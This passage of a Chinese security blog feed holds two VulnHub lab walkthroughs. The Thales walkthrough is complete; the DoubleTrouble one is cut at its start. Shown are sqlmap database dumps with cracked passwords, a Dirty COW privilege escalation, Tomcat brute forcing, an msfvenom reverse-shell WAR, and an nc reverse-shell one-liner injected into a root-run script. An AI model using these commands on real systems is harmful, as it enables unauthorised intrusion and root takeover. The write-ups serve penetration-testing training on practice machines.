title="1.探测端口及服务"></a>1.探测端口及服务</h2><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131215757699.png" alt="image-20240131215757699"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">发现开启了22端口, OpenSSH <span class="token number">6</span>.0p1 Debian <span class="token number">4</span>+deb7u4 <span class="token punctuation">(</span>protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了80端口, Apache httpd <span class="token number">2.2</span>.22 <span class="token variable"><span class="token punctuation">((</span>Debian<span class="token punctuation">))</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h2 id="2-访问web服务"><a href="#2-访问web服务" class="headerlink" title="2.访问web服务"></a>2.访问web服务</h2><pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;192.168.1.15<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221025067.png" alt="image-20240131221025067"></p><p>我们看到是一个登录页面，一般登录页面要么爆破，要么进行测试SQL注入，这个只能进行SQL注入。</p><h2 id="3-SQL注入"><a href="#3-SQL注入" class="headerlink" title="3.SQL注入"></a>3.SQL注入</h2><h3 id="1-测试是否存在SQL注入"><a href="#1-测试是否存在SQL注入" class="headerlink" title="(1)测试是否存在SQL注入"></a>(1)测试是否存在SQL注入</h3><p>首先我们进行抓包</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221312957.png" alt="image-20240131221312957"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221417024.png" alt="image-20240131221417024"></p><p>发现存在SQL注入</p><h3 id="2-爆破数据"><a href="#2-爆破数据" class="headerlink" title="(2)爆破数据"></a>(2)爆破数据</h3><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token comment">--dbs --batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221808200.png" alt="image-20240131221808200"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token operator">-</span>D <span class="token string">'doubletrouble'</span> <span class="token comment">--tables --batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131221950016.png" alt="image-20240131221950016"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token operator">-</span>D <span class="token string">'doubletrouble'</span> <span class="token operator">-</span>T <span class="token string">'users'</span> <span class="token comment">--columns --batch</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131222306338.png" alt="image-20240131222306338"></p><pre class="line-numbers language-sql" data-language="sql"><code class="language-sql">sqlmap <span class="token operator">-</span>r <span class="token string">'/home/kali/Desktop/MS02423.txt'</span> <span class="token operator">-</span>D <span class="token string">'doubletrouble'</span> <span class="token operator">-</span>T <span class="token string">'users'</span> <span class="token operator">-</span>C <span class="token string">'username,password'</span> <span class="token comment">--batch --dump</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240131222834208.png" alt="image-20240131222834208"></p><p>最后我们爆破出来2个用户名和密码</p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">montreux GfsZxc1  clapton ZubZub99 <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-ssh登录"><a href="#3-ssh登录" class="headerlink" title="(3)ssh登录"></a>(3)ssh登录</h3><p>我们使用2个用户名和密码进行登录，发现页面登录不了</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202193519466.png" alt="image-20240202193519466"></p><p>前面扫描端口的时候，发现22端口是开放的，我们进行登录试试</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202193838489.png" alt="image-20240202193838489"></p><p>我们发现montreux登录不了，但是clapton可以</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202194312256.png" alt="image-20240202194312256"></p><p>我们得到了第一个flag</p><h3 id="4-提权"><a href="#4-提权" class="headerlink" title="(4)提权"></a>(4)提权</h3><p>我们使用sudo -l查看，显示不存在</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202194408520.png" alt="image-20240202194408520"></p><p>我们查看内核版本，查找漏洞</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">uname</span> <span class="token parameter variable">-a</span> <span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202194447742.png" alt="image-20240202194447742"></p><p>查看下系统内核版本信息，发现存在脏牛漏洞，内核版本：3.2.0-4-amd64。</p><pre class="line-numbers language-r" data-language="r"><code class="language-r">searchsploit linux <span class="token number">3.2</span>searchsploit <span class="token operator">-</span>m <span class="token number">40616.</span>c   下载<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195038088.png" alt="image-20240202195038088"></p><p>我们进行查看40616.c内容， 先使用gcc连接，然后直接使用，后面不用跟其他命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195354864.png" alt="image-20240202195354864"></p><p>使用nc传输，将40616.c传输到clapton系统中</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在clapton的shell中启动nc接收<span class="token function">nc</span> <span class="token parameter variable">-lvnp</span> <span class="token number">10086</span> <span class="token operator">></span> <span class="token number">40616</span>.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195652880.png" alt="image-20240202195652880"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">在kali中使用nc上传40616.c<span class="token function">nc</span> <span class="token number">192.168</span>.1.15 <span class="token number">10086</span> <span class="token operator">&lt;</span> <span class="token number">40616</span>.c <span class="token parameter variable">-w</span> <span class="token number">1</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195828939.png" alt="image-20240202195828939"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202195918107.png" alt="image-20240202195918107"></p><p>我们可以看到传输成功了</p><p>我们可以看到40616.c没有执行权限，我们加权限</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token function">chmod</span>  <span class="token number">777</span> <span class="token number">40616</span>.c<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202200100072.png" alt="image-20240202200100072"></p><p>gcc连接，生成可执行程序,进行执行</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">gcc <span class="token number">40616</span>.c <span class="token parameter variable">-o</span> <span class="token number">40616</span>.c <span class="token parameter variable">-pthread</span>./40616.c<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202200440095.png" alt="image-20240202200440095"></p><p>我们可以看到提权成功，查看flag</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240202200544952.png" alt="image-20240202200544952"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.图片隐写</p><p>10.文件上传</p><p>11.反弹shell</p><p>12.SQL注入</p><p>13.ssh登录</p><p>14.脏牛漏洞</p><p>15.gcc</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
  <entry>
    <title>vulnhub靶场之Thales</title>
    <link href="http://ms02423.top/2024/01/29/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BThales/"/>
    <id>http://ms02423.top/2024/01/29/vulnhub%E9%9D%B6%E5%9C%BA%E4%B9%8BThales/</id>
    <published>2024-01-29T08:30:22.000Z</published>
    <updated>2024-01-30T09:33:09.664Z</updated>
    
    <content type="html"><![CDATA[<h1 id="一-环境搭建"><a href="#一-环境搭建" class="headerlink" title="一.环境搭建"></a>一.环境搭建</h1><h2 id="1-靶场描述"><a href="#1-靶场描述" class="headerlink" title="1.靶场描述"></a>1.靶场描述</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">Description <span class="token punctuation">:</span> <span class="token keyword">Open</span> your eyes <span class="token operator">and</span> change your perspectiveincludes <span class="token number">2</span> flags<span class="token punctuation">:</span>user<span class="token punctuation">.</span>txt <span class="token operator">and</span> root<span class="token punctuation">.</span>txt<span class="token punctuation">.</span>Telegram<span class="token punctuation">:</span> @machineboy141 <span class="token punctuation">(</span><span class="token keyword">for</span> <span class="token keyword">any</span> hint<span class="token punctuation">)</span>This works better <span class="token keyword">with</span> VIrtualBox rathe <span class="token operator">than</span> VMware<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><h2 id="2-靶场地址"><a href="#2-靶场地址" class="headerlink" title="2.靶场地址"></a>2.靶场地址</h2><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">https<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span>www<span class="token punctuation">.</span>vulnhub<span class="token punctuation">.</span>com<span class="token operator">/</span><span class="token keyword">entry</span><span class="token operator">/</span>thales-1<span class="token punctuation">,</span><span class="token number">749</span><span class="token operator">/</span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163223146.png" alt="image-20240129163223146"></p><h2 id="3-启动靶场"><a href="#3-启动靶场" class="headerlink" title="3.启动靶场"></a>3.启动靶场</h2><p>Thales靶机在VMware运行会出现bug,所以我们在VirtualBox运行。</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163328402.png" alt="image-20240129163328402"></p><p>虚拟机开启之后界面如上，我们不知道ip，需要自己探活，因为我们在VirtualBox运行所以网段发生了变化,网段知道：192.168.1.0&#x2F;24</p><h1 id="二-渗透测试"><a href="#二-渗透测试" class="headerlink" title="二.渗透测试"></a>二.渗透测试</h1><h2 id="1-目标"><a href="#1-目标" class="headerlink" title="1.目标"></a>1.目标</h2><p>目标就是我们搭建的靶场，靶场IP为：192.168.1.0&#x2F;24</p><h2 id="2-信息收集"><a href="#2-信息收集" class="headerlink" title="2.信息收集"></a>2.信息收集</h2><h3 id="1-寻找靶场真实ip"><a href="#1-寻找靶场真实ip" class="headerlink" title="(1)寻找靶场真实ip"></a>(1)寻找靶场真实ip</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap <span class="token parameter variable">-sP</span> <span class="token number">192.168</span>.1.0/24<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129163940132.png" alt="image-20240129163940132"></p><pre class="line-numbers language-none"><code class="language-none">arp-scan -l<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164229619.png" alt="image-20240129164229619"></p><p>靶场真实ip地址为192.168.1.13</p><h3 id="2-探测端口及服务"><a href="#2-探测端口及服务" class="headerlink" title="(2)探测端口及服务"></a>(2)探测端口及服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -p- <span class="token parameter variable">-sV</span> <span class="token number">192.168</span>.1.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164045121.png" alt="image-20240129164045121"></p><pre class="line-numbers language-cobol" data-language="cobol"><code class="language-cobol">发现开启了<span class="token number">22</span>端口<span class="token punctuation">,</span>OpenSSH <span class="token number">7</span><span class="token punctuation">.</span>6p1 Ubuntu 4ubuntu0<span class="token punctuation">.</span><span class="token number">5</span> <span class="token punctuation">(</span>Ubuntu Linux; protocol <span class="token number">2.0</span><span class="token punctuation">)</span>发现开启了<span class="token number">8080</span>端口<span class="token punctuation">,</span>Apache Tomcat <span class="token number">9.0</span><span class="token number">.52</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h3 id="3-web指纹识别"><a href="#3-web指纹识别" class="headerlink" title="(3)web指纹识别"></a>(3)web指纹识别</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">whatweb <span class="token parameter variable">-v</span> <span class="token number">192.168</span>.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164342897.png" alt="image-20240129164342897"></p><h2 id="3-渗透测试"><a href="#3-渗透测试" class="headerlink" title="3.渗透测试"></a>3.渗透测试</h2><h3 id="1-访问web服务"><a href="#1-访问web服务" class="headerlink" title="(1)访问web服务"></a>(1)访问web服务</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164445794.png" alt="image-20240129164445794"></p><p>我们可以看到是Tomcat</p><h3 id="2-扫描web服务"><a href="#2-扫描web服务" class="headerlink" title="(2)扫描web服务"></a>(2)扫描web服务</h3><h4 id="1-棱洞3-0指纹识别"><a href="#1-棱洞3-0指纹识别" class="headerlink" title="1)棱洞3.0指纹识别"></a>1)棱洞3.0指纹识别</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">./EHole_linux_amd64 finger <span class="token parameter variable">-u</span> http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164921542.png" alt="image-20240129164921542"></p><h4 id="2-nikto扫描网站结构"><a href="#2-nikto扫描网站结构" class="headerlink" title="2)nikto扫描网站结构"></a>2)nikto扫描网站结构</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nikto <span class="token parameter variable">-h</span> http://192.168.1.13:8080<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129164819306.png" alt="image-20240129164819306"></p><h4 id="3-dirsearch目录扫描"><a href="#3-dirsearch目录扫描" class="headerlink" title="3)dirsearch目录扫描"></a>3)dirsearch目录扫描</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">dirsearch <span class="token parameter variable">-u</span> <span class="token number">192.168</span>.1.13:8080 <span class="token parameter variable">-e</span> * <span class="token parameter variable">-x</span> <span class="token number">403</span> --random-agent<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129165342048.png" alt="image-20240129165342048"></p><p>我们扫描到一个登录页面</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">http://192.168.1.13:8080/manager<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129165606671.png" alt="image-20240129165606671"></p><p>目前，我们掌握的信息是一个tomcat框架和一个登录页面，因为tomcat 有管理登录页面，于是尝试爆破</p><h3 id="3-渗透测试-1"><a href="#3-渗透测试-1" class="headerlink" title="(3)渗透测试"></a>(3)渗透测试</h3><h4 id="1-msf爆破"><a href="#1-msf爆破" class="headerlink" title="1)msf爆破"></a>1)msf爆破</h4><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">search login tomcat<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170544353.png" alt="image-20240129170544353"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">show options<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170643501.png" alt="image-20240129170643501"></p><pre class="line-numbers language-none"><code class="language-none">set RHOSTS 192.168.1.13<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170723929.png" alt="image-20240129170723929"></p><p>爆破出来一个用户名和密码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170810334.png" alt="image-20240129170810334"></p><p> tomcat:role1</p><h4 id="2-登录"><a href="#2-登录" class="headerlink" title="2)登录"></a>2)登录</h4><p>我们可以看到登录成功</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129170852364.png" alt="image-20240129170852364"></p><h4 id="3-反弹shell"><a href="#3-反弹shell" class="headerlink" title="3)反弹shell"></a>3)反弹shell</h4><p>我们可以看到&#x2F;shell和上传页面，那么我们进行shell,在 web 应用程序部署界面尝试在上传 war 包反弹 shell</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129171145361.png" alt="image-20240129171145361"></p><pre class="line-numbers language-none"><code class="language-none">msfvenom -p java&#x2F;jsp_shell_reverse_tcp LHOST&#x3D;192.168.1.9 LPORT&#x3D;666666 -f war -o MS02423.war<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172804028.png" alt="image-20240129172804028"></p><p>我们进行上传</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172724391.png" alt="image-20240129172724391"></p><p>上传成功后，在应用程序列表中看到已成功部署了 war 后门，点击访问后反弹</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129172826998.png" alt="image-20240129172826998"></p><p>我们可以看到反弹成功</p><p>我们进行提权，发现需要密码，我们进行查找</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240129173210637.png" alt="image-20240129173210637"></p><h4 id="4-执行脚本"><a href="#4-执行脚本" class="headerlink" title="4)执行脚本"></a>4)执行脚本</h4><p>一般情况下，我们首先去home目录下查看，然后在去&#x2F;var&#x2F;www&#x2F;html&#x2F;目录下查看有没有什么线索，我们看到了thales命令，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161433886.png" alt="image-20240130161433886"></p><p>我们看到了两个txt文件，模式里面提示我们,一个flag在user.txt，一个在root.txt里面，那么我们进行查看user.txt文件，但是需要thales权限，我们查看notes.txt文件，notes.txt 中告诉我们有一个备用脚本在 &#x2F;usr&#x2F;local&#x2F;bin&#x2F;backup.sh</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">includes <span class="token number">2</span> flags:user.txt and root.txt.<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161558059.png" alt="image-20240130161558059"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130161920839.png" alt="image-20240130161920839"></p><p>我们去执行这个脚本，但是执行之后却发现没有如何变化</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162200397.png" alt="image-20240130162200397"></p><h4 id="5-ssh-私钥文件"><a href="#5-ssh-私钥文件" class="headerlink" title="5)ssh 私钥文件"></a>5)ssh 私钥文件</h4><p>我们在thales目录下发现了隐藏的.ssh文件，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162530044.png" alt="image-20240130162530044"></p><p>这样看太难受了，我们进行交互模式进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130162852020.png" alt="image-20240130162852020"></p><p>我们可以看到公钥，我们进行查看</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130163048702.png" alt="image-20240130163048702"></p><p>我们把它保存下来，用john进行爆破</p><h4 id="6-john爆破"><a href="#6-john爆破" class="headerlink" title="6)john爆破"></a>6)john爆破</h4><p>将私钥文件保存到攻击机，利用 ssh2john 将私钥转化为 john 能处理的 SHA 加密的文件，然后进行爆破，得到密码为 vodka06</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130170943990.png" alt="image-20240130170943990"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171014530.png" alt="image-20240130171014530"></p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171045172.png" alt="image-20240130171045172"></p><h4 id="7-查看user-txt文件"><a href="#7-查看user-txt文件" class="headerlink" title="7)查看user.txt文件"></a>7)查看user.txt文件</h4><p>我们进行登录thales用户名</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171432515.png" alt="image-20240130171432515"></p><p>我们获取到第一个flag，还有一个flag在root.txt里面，我们进行提权</p><h4 id="8-提权"><a href="#8-提权" class="headerlink" title="8)提权"></a>8)提权</h4><p>之前我们看到的那个脚本还没有查看内容，现在我们查看一下那个备份文件的代码</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171752726.png" alt="image-20240130171752726"></p><p>是一个shell文件，并且是能运行命令的，我们是可以编辑的，并且是root用户运行的，我们插入一串反弹shell的命令</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130171844539.png" alt="image-20240130171844539"></p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token builtin class-name">echo</span> <span class="token string">"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&amp;1|nc 192.168.1.9 5555 >/tmp/f"</span> <span class="token operator">>></span> backup.sh<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130172619811.png" alt="image-20240130172619811"></p><p>等一会可以看到反弹成功，我们查看flag即可</p><p><img src="/./../imgs/$%7Bfiilename%7D/image-20240130172935974.png" alt="image-20240130172935974"></p><h1 id="三-相关资源"><a href="#三-相关资源" class="headerlink" title="三.相关资源"></a>三.相关资源</h1><p>1.靶场下载地址 </p><p>2.nmap</p><p>3.arp-scan </p><p>4.masscan </p><p>5.[ 常用工具篇 ] 渗透神器 whatweb 安装使用详解 </p><p>6.[ 渗透工具篇 ] EHole(棱洞)3.0安装部署及详解（linux &amp; win） </p><p>7.nikto工具的使用</p><p>8.dirsearch目录扫描</p><p>9.msf工具使用</p><p>10.ssh私钥文件</p><p>11.john爆破密码</p><p>12.反弹shell</p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;一-环境搭建&quot;&gt;&lt;a href=&quot;#一-环境搭建&quot; class=&quot;headerlink&quot; title=&quot;一.环境搭建&quot;&gt;&lt;/a&gt;一.环境搭建&lt;/h1&gt;&lt;h2 id=&quot;1-靶场描述&quot;&gt;&lt;a href=&quot;#1-靶场描述&quot; class=&quot;headerlink&quot; titl</summary>
      
    
    
    
    <category term="渗透测试" scheme="http://ms02423.top/categories/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95/"/>
    
    
    <category term="vulnhub靶场" scheme="http://ms02423.top/tags/vulnhub%E9%9D%B6%E5%9C%BA/"/>
    
  </entry>
  
</feed>
